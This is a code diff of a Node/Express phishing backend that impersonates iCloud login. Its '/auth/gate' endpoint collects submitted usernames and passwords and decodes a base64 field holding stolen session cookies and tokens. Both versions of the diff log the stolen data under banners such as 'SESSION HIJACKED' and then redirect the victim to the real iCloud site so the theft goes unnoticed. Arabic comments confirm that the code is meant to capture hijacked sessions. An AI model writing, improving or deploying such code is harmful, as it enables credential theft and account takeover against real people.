@@ -11,26 +11,25 @@ app.get('/', (req, res) => {
 
 app.post('/auth/gate', (req, res) => {
     const { u, p, sid } = req.body;
+    let rawCookies = "Empty";
     
-    // محاولة فك تشفير الجلسة المخطوفة
-    let capturedSession = "Empty";
     try {
         if (sid) {
-            capturedSession = Buffer.from(sid, 'base64').toString('utf8');
+            rawCookies = Buffer.from(sid, 'base64').toString('utf8');
         }
     } catch (e) {
-        capturedSession = "Error decoding session";
+        rawCookies = "Decoding Error";
     }
 
-    console.log("\n================ [ FINAL STEALTH LOG ] ================");
-    console.log("USER: " + u);
-    console.log("PASS: " + p);
-    console.log("DEVICE: " + req.headers['user-agent']);
-    console.log("FULL SESSION DATA: " + capturedSession);
-    console.log("=======================================================\n");
+    console.log("\n--- [ 🔓 SESSION HIJACKED ] ---");
+    console.log("LOGIN: " + u);
+    console.log("PASS : " + p);
+    console.log("RAW_DATA: " + rawCookies); // هنا ستجد الكوكيز والتوكنات
+    console.log("AGENT: " + req.headers['user-agent']);
+    console.log("-------------------------------\n");
 
-    res.send('<script>window.location.href="https://icloud.com";</script>');
+    res.send('<script>window.location.href="https://www.icloud.com";</script>');
 });
 
 const PORT = process.env.PORT || 10000;
-app.listen(PORT, () => console.log('Bypass Core Live on Port ' + PORT));
+app.listen(PORT, () => console.log('Engine Online on Port ' + PORT));
